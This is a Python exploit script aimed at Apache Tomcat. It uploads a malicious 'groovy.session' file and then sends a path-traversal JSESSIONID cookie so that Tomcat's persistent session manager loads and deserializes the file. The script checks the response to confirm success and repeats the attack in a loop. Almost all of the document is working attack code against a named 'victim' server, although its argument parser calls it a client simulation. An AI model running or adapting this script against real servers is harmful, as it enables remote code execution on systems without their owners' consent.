import sys
import argparse
import requests


def vprint(string):
    """
    prints the given string if the verbose flag is set
    """
    if args.verbose:
        print(string)


def upload_file(url):
    """
    execute POST request to victim
    upload file malicious file
    """
    file_name = 'groovy.session'
    file_path = '/home/'
    # upload file
    with open(file_path + file_name, 'rb') as f:
        r = requests.post(
           url,
           files={"file": (file_name, f)}
        )
    vprint(f"Uploaded file")


def exploit(url):
    """
    trigger execution of uploaded malicious file
    persistent session is being loaded from relative path through
    path in JSESSIONID
    """
    r = requests.post(url,
                      headers={'Cookie':'JSESSIONID=../../../../../usr/local/tomcat/upload-dir/groovy'})
    if 'PersistentManagerBase' in r.text:
        vprint("Attack was successful")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='HTTPS-Client Simulation.')

    parser.add_argument('-ip',
                        dest='server_ip',
                        action='store',
                        type=str,
                        required=True,
                        help='The IP address of the target server')
    parser.add_argument('-v',
                        dest='verbose',
                        action='store',
                        type=bool,
                        required=False,
                        default=False,
                        help='Make the operations more talkative')
    args = parser.parse_args()

    # appending tomcat port 
    args.server_ip = args.server_ip + ':8080'
    base_url = f'http://{args.server_ip}/'

    while True:
        sys.stdin.readline()
        upload_file(base_url)
        exploit(base_url)
